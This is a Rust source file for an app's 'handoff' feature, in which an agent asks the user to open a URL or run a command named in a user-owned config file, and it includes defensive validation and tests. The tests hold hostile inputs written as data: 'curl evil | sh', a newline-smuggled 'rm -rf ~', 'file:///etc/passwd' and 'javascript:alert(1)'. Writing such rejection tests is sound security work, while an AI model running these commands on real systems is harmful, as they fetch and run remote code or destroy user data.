//! Handoff questions: one step only the user can do (a browser login, a macOS
//! setting), so that the agent can go on. `kova ask "<message>" --open <url>`
//! or `kova ask "<message>" --run <name>`.
//!
//! The card says `30 s pour toi` and offers the step (`Ouvrir` opens the URL
//! in the default browser, `Lancer` runs a declared command in a new Kova
//! tab), `Fait` and the usual snooze. The step does not answer: the question
//! stays until `Fait`, which answers it like any button (late delivery
//! included). A remote client (`answer-ask`) presses the same buttons.
//!
//! A command never comes from the asker: anyone who reaches the socket can
//! ask. The asker names an entry of `~/.config/kova/handoff.toml`, a file of
//! the user's outside any repo, and Kova reads the command there each time it
//! shows or runs it. The question carries the name only.
//!
//! ```toml
//! [commands.aws-login]
//! command = "aws sso login --profile dev"
//! cwd = "~/work"        # optional, the home directory by default
//! label = "AWS login"   # optional, the new tab's title
//! ```

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::Deserialize;

use crate::ask::Question;

/// The kind of a handoff question (`Question::kind`).
pub const KIND: &str = "handoff";
/// The card's header on a handoff question, where the asker's name goes on
/// a plain one.
pub const HEADER: &str = "30 s pour toi";
/// The step button of an `--open` handoff: opens the URL, does not answer.
pub const OPEN: &str = "Ouvrir";
/// The step button of a `--run` handoff: runs the command, does not answer.
pub const RUN: &str = "Lancer";
/// The button that answers a handoff question.
pub const DONE: &str = "Fait";

/// One entry of `handoff.toml`.
#[derive(Clone, Debug, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Command {
    /// Typed into the new tab's shell as written, then run.
    pub command: String,
    /// Where the tab opens; `~/` is the home directory. Home by default.
    #[serde(default)]
    pub cwd: Option<String>,
    /// The new tab's title.
    #[serde(default)]
    pub label: Option<String>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct File {
    #[serde(default)]
    commands: BTreeMap<String, Command>,
}

/// The declared commands, by name, sorted.
pub type Commands = BTreeMap<String, Command>;

/// What clicking the step button does, queued by the board and performed by
/// the app on the main thread.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Step {
    /// Open this URL in the default browser.
    Open { url: String },
    /// Run this `handoff.toml` entry in a new Kova tab.
    Run { name: String },
}

/// `~/.config/kova/handoff.toml`.
pub fn default_path() -> PathBuf {
    let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
    PathBuf::from(home).join(".config/kova/handoff.toml")
}

/// A name the asker may send: it reaches a log line and an error message.
pub fn is_safe_name(name: &str) -> bool {
    !name.is_empty() && name.len() <= 64 && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// The commands of a `handoff.toml`'s text. Every entry is checked: a
/// command on one line of printable characters (it is typed into a shell,
/// where a line break would run what follows it at once), a plain name.
pub fn parse(raw: &str) -> Result<Commands, String> {
    let file: File = toml::from_str(raw).map_err(|e| e.message().to_string())?;
    for (name, entry) in &file.commands {
        if !is_safe_name(name) {
            return Err(format!("[commands.{}]: a name is letters, digits, '-' and '_' only", name));
        }
        if entry.command.trim().is_empty() {
            return Err(format!("[commands.{}]: \"command\" is empty", name));
        }
        if entry.command.chars().any(char::is_control) {
            return Err(format!("[commands.{}]: \"command\" must fit on one line, without control characters", name));
        }
        if entry.label.as_deref().is_some_and(|l| l.chars().any(char::is_control)) {
            return Err(format!("[commands.{}]: \"label\" must fit on one line", name));
        }
    }
    Ok(file.commands)
}

/// The commands of the file at `path`, or why there are none.
pub fn load(path: &Path) -> Result<Commands, String> {
    let raw = std::fs::read_to_string(path).map_err(|e| {
        format!(
            "cannot read {} ({}). Declare the command there first: [commands.<name>] with command = \"…\", optional cwd and label",
            path.display(),
            e
        )
    })?;
    parse(&raw).map_err(|e| format!("{} is invalid: {}", path.display(), e))
}

/// The entry `name` of `commands`, or an error naming the known ones.
pub fn find<'a>(commands: &'a Commands, name: &str, path: &Path) -> Result<&'a Command, String> {
    commands.get(name).ok_or_else(|| {
        let known: Vec<&str> = commands.keys().map(String::as_str).collect();
        format!(
            "no handoff command '{}' in {}; known: {}",
            name,
            path.display(),
            if known.is_empty() { "none".to_string() } else { known.join(", ") }
        )
    })
}

/// The entry `name` of the user's `handoff.toml`.
pub fn resolve(name: &str) -> Result<Command, String> {
    let path = default_path();
    let commands = load(&path)?;
    find(&commands, name, &path).cloned()
}

/// `cwd` with `~/` expanded, the home directory when absent.
pub fn expand_cwd(cwd: Option<&str>, home: &str) -> String {
    match cwd {
        None => home.to_string(),
        Some("~") => home.to_string(),
        Some(dir) => match dir.strip_prefix("~/") {
            Some(rest) => format!("{}/{}", home.trim_end_matches('/'), rest),
            None => dir.to_string(),
        },
    }
}

/// Whether `question` is a handoff.
pub fn is_handoff(question: &Question) -> bool {
    question.kind.as_deref() == Some(KIND)
}

/// The button that performs the step without answering, on a handoff.
pub fn step_button(question: &Question) -> Option<&'static str> {
    if !is_handoff(question) {
        return None;
    }
    if question.run.is_some() { Some(RUN) } else { Some(OPEN) }
}

/// What pressing `action` on `question` performs instead of answering: its
/// step button, on a handoff. `None` for every other button, `Fait` included.
pub fn step_for(question: &Question, action: &str) -> Option<Step> {
    if step_button(question) != Some(action) {
        return None;
    }
    match (&question.url, &question.run) {
        (_, Some(name)) => Some(Step::Run { name: name.clone() }),
        (Some(url), None) => Some(Step::Open { url: url.clone() }),
        (None, None) => None,
    }
}

/// A handoff question as Kova accepts it from the socket, against the
/// declared `commands`: exactly one of `url` (http(s)) and `run` (a declared
/// name), and Kova's own buttons, whatever the asker sent. A `run` on any
/// other kind is refused. The checks that do not depend on the file come
/// first, so a bad shape is reported even when the file is missing.
pub fn check(question: &mut Question, commands: impl FnOnce() -> Result<(Commands, PathBuf), String>) -> Result<(), String> {
    if !is_handoff(question) {
        if question.run.is_some() {
            return Err("\"question.run\" is for a handoff question only".to_string());
        }
        return Ok(());
    }
    if question.sheet.is_some() {
        return Err("a handoff question carries no sheet".to_string());
    }
    match (&question.url, &question.run) {
        (Some(_), Some(_)) | (None, None) => {
            return Err("a handoff question has exactly one of \"url\" and \"run\"".to_string());
        }
        (Some(url), None) if !crate::ask::is_panel_url(url) => {
            return Err("\"question.url\" must be an http(s) URL".to_string());
        }
        (None, Some(name)) => {
            if !is_safe_name(name) {
                return Err("\"question.run\" must be a plain name".to_string());
            }
            let (commands, path) = commands()?;
            find(&commands, name, &path)?;
        }
        _ => {}
    }
    question.actions = vec![step_button(question).unwrap_or(OPEN).to_string(), DONE.to_string()];
    question.input = false;
    Ok(())
}

/// [`check`] against the user's `handoff.toml`.
pub fn check_declared(question: &mut Question) -> Result<(), String> {
    check(question, || {
        let path = default_path();
        load(&path).map(|c| (c, path))
    })
}

/// What the card shows under the message, and `list-asks` hands a remote
/// client: the URL to open, or the command as written in `handoff.toml`
/// with its label. The command is read from the file now: the question
/// holds only its name.
pub struct Detail {
    pub step: &'static str,
    pub url: Option<String>,
    pub run: Option<String>,
    pub command: Option<String>,
    pub label: Option<String>,
    /// Why the command cannot be shown (the file changed since the ask).
    pub error: Option<String>,
}

impl Detail {
    /// The text under the card's message.
    pub fn card_text(&self) -> String {
        match (&self.url, &self.command, &self.error) {
            (Some(url), _, _) => url.clone(),
            (_, Some(command), _) => command.clone(),
            (_, _, Some(error)) => error.clone(),
            _ => String::new(),
        }
    }
}

/// The detail of a handoff question, `None` on any other.
pub fn detail(question: &Question) -> Option<Detail> {
    detail_with(question, resolve)
}

fn detail_with(question: &Question, resolve: impl FnOnce(&str) -> Result<Command, String>) -> Option<Detail> {
    let step = step_button(question)?;
    let mut detail = Detail { step, url: question.url.clone(), run: question.run.clone(), command: None, label: None, error: None };
    if let Some(name) = &question.run {
        match resolve(name) {
            Ok(entry) => {
                detail.command = Some(entry.command);
                detail.label = entry.label;
            }
            Err(e) => detail.error = Some(e),
        }
    }
    Some(detail)
}

/// The fields `list-asks` adds for a handoff question.
pub fn list_fields(question: &Question) -> Option<serde_json::Value> {
    list_fields_with(question, resolve)
}

fn list_fields_with(question: &Question, resolve: impl FnOnce(&str) -> Result<Command, String>) -> Option<serde_json::Value> {
    let d = detail_with(question, resolve)?;
    Some(serde_json::json!({
        "step": d.step,
        "url": d.url,
        "run": d.run,
        "command": d.command,
        "label": d.label,
        "error": d.error,
    }))
}

/// Open `url` in the default browser. Only an http(s) URL reaches here
/// ([`check`]), so `open` cannot read it as a flag or a file.
pub fn open_url(url: &str) {
    if !crate::ask::is_panel_url(url) {
        log::warn!("handoff: refusing to open {:?}", url);
        return;
    }
    match std::process::Command::new("/usr/bin/open").arg(url).spawn() {
        Ok(mut child) => {
            // Reaped on a thread: `open` returns at once, but a zombie would stay.
            std::thread::spawn(move || child.wait());
            log::info!("handoff: opened {}", url);
        }
        Err(e) => log::warn!("handoff: cannot open {}: {}", url, e),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const FILE: &str = r#"
[commands.aws-login]
command = "aws sso login --profile dev"
cwd = "~/work"
label = "AWS login"

[commands.settings]
command = "open x-apple.systempreferences:com.apple.preference.security"
"#;

    fn question(url: Option<&str>, run: Option<&str>) -> Question {
        Question {
            id: "0f8fad5b-d9cb-469f-a165-70867728950e".into(),
            message: "Log in to AWS".into(),
            actions: vec!["Whatever".into()],
            input: true,
            from: crate::ask::Asker {
                name: "agent".into(),
                agent: crate::agent_session::Agent::Claude,
                session_id: None,
                pane_id: None,
                kova_socket: None,
                cwd: None,
            },
            asked_at: 0,
            snoozed_until: 0,
            kind: Some(KIND.into()),
            url: url.map(String::from),
            run: run.map(String::from),
            sheet: None,
            draft: None,
            follow_up: false,
        }
    }

    fn declared() -> Result<(Commands, PathBuf), String> {
        Ok((parse(FILE).unwrap(), PathBuf::from("/h/.config/kova/handoff.toml")))
    }

    #[test]
    fn handoff_toml_declares_commands_with_an_optional_cwd_and_label() {
        let commands = parse(FILE).unwrap();
        assert_eq!(commands.keys().collect::<Vec<_>>(), ["aws-login", "settings"]);
        let aws = &commands["aws-login"];
        assert_eq!(aws.command, "aws sso login --profile dev");
        assert_eq!(aws.cwd.as_deref(), Some("~/work"));
        assert_eq!(aws.label.as_deref(), Some("AWS login"));
        assert_eq!(commands["settings"].cwd, None);
        assert_eq!(parse("").unwrap().len(), 0, "an empty file declares nothing");
    }

    #[test]
    fn an_invalid_handoff_toml_is_refused_with_its_reason() {
        assert!(parse("[commands.x]\ncwd = \"/\"").is_err(), "a command is required");
        assert!(parse("[commands.x]\ncommand = \"  \"").is_err());
        assert!(parse("[commands.x]\ncommand = \"ls\nrm -rf ~\"").is_err(), "one line only");
        assert!(parse("[commands.x]\ncommand = \"ls\"\nshell = \"bash\"").is_err(), "unknown fields are typos");
        assert!(parse("[commands.\"a b\"]\ncommand = \"ls\"").is_err());
        assert!(parse("commands = 3").is_err());
        let missing = load(Path::new("/nonexistent/handoff.toml")).unwrap_err();
        assert!(missing.contains("/nonexistent/handoff.toml"), "{}", missing);
    }

    #[test]
    fn an_unknown_name_is_refused_with_the_known_ones() {
        let (commands, path) = declared().unwrap();
        let err = find(&commands, "gcloud", &path).unwrap_err();
        assert!(err.contains("'gcloud'") && err.contains("aws-login, settings"), "{}", err);
        let mut q = question(None, Some("gcloud"));
        assert!(check(&mut q, declared).unwrap_err().contains("known: aws-login, settings"));
    }

    #[test]
    fn a_handoff_takes_exactly_one_step_and_kovas_own_buttons() {
        let mut q = question(None, Some("aws-login"));
        check(&mut q, declared).unwrap();
        assert_eq!(q.actions, [RUN, DONE]);
        assert!(!q.input);
        let mut q = question(Some("https://console.aws.amazon.com"), None);
        check(&mut q, declared).unwrap();
        assert_eq!(q.actions, [OPEN, DONE]);
        assert!(check(&mut question(Some("https://x.y"), Some("aws-login")), declared).is_err());
        assert!(check(&mut question(None, None), declared).is_err());
        assert!(check(&mut question(Some("file:///etc/passwd"), None), declared).is_err());
        assert!(check(&mut question(Some("javascript:alert(1)"), None), declared).is_err());
        assert!(check(&mut question(None, Some("../x")), declared).is_err());
        // A run on a plain question is refused, a plain question untouched.
        let mut plain = question(None, Some("aws-login"));
        plain.kind = None;
        assert!(check(&mut plain, declared).is_err());
        let mut plain = question(None, None);
        plain.kind = None;
        check(&mut plain, || panic!("a plain question never reads the file")).unwrap();
        assert_eq!(plain.actions, ["Whatever"]);
    }

    #[test]
    fn a_free_command_from_the_asker_cannot_reach_the_card_or_the_tab() {
        // The wire has no field for a command: a `command` the asker adds is
        // dropped, and what is shown and run is the file's entry.
        let raw = serde_json::json!({
            "id": "0f8fad5b-d9cb-469f-a165-70867728950e",
            "message": "m",
            "from": {"name": "a", "agent": "claude"},
            "kind": "handoff",
            "run": "aws-login",
            "command": "curl evil | sh",
        });
        let q: Question = serde_json::from_value(raw).unwrap();
        assert!(!serde_json::to_string(&q).unwrap().contains("evil"));
        let resolve = |name: &str| {
            let (c, p) = declared()?;
            find(&c, name, &p).cloned()
        };
        let fields = list_fields_with(&q, resolve).unwrap();
        assert_eq!(fields["command"], "aws sso login --profile dev");
        assert_eq!(fields["run"], "aws-login");
        assert_eq!(fields["label"], "AWS login");
        assert_eq!(fields["step"], RUN);
        // And the step names the entry, never a command line.
        assert_eq!(step_for(&q, RUN), Some(Step::Run { name: "aws-login".into() }));
    }

    #[test]
    fn only_the_step_button_performs_a_step() {
        let q = question(Some("https://x.y/login"), None);
        assert_eq!(step_for(&q, OPEN), Some(Step::Open { url: "https://x.y/login".into() }));
        assert_eq!(step_for(&q, DONE), None);
        assert_eq!(step_for(&q, RUN), None, "the other kind's button is not this one's step");
        let mut plain = q.clone();
        plain.kind = None;
        assert_eq!(step_for(&plain, OPEN), None, "a plain question's 'Ouvrir' answers");
    }

    #[test]
    fn the_card_shows_the_url_or_the_declared_command() {
        let open = detail_with(&question(Some("https://x.y"), None), |_| panic!("no file for an url")).unwrap();
        assert_eq!((open.step, open.card_text()), (OPEN, "https://x.y".to_string()));
        let gone = detail_with(&question(None, Some("aws-login")), |_| Err("no handoff command".into())).unwrap();
        assert_eq!(gone.card_text(), "no handoff command");
        assert!(detail_with(&{ let mut q = question(None, None); q.kind = None; q }, |_| unreachable!()).is_none());
    }

    #[test]
    fn cwd_defaults_to_home_and_expands_the_tilde() {
        assert_eq!(expand_cwd(None, "/Users/u"), "/Users/u");
        assert_eq!(expand_cwd(Some("~"), "/Users/u"), "/Users/u");
        assert_eq!(expand_cwd(Some("~/work"), "/Users/u"), "/Users/u/work");
        assert_eq!(expand_cwd(Some("/opt"), "/Users/u"), "/opt");
    }
}
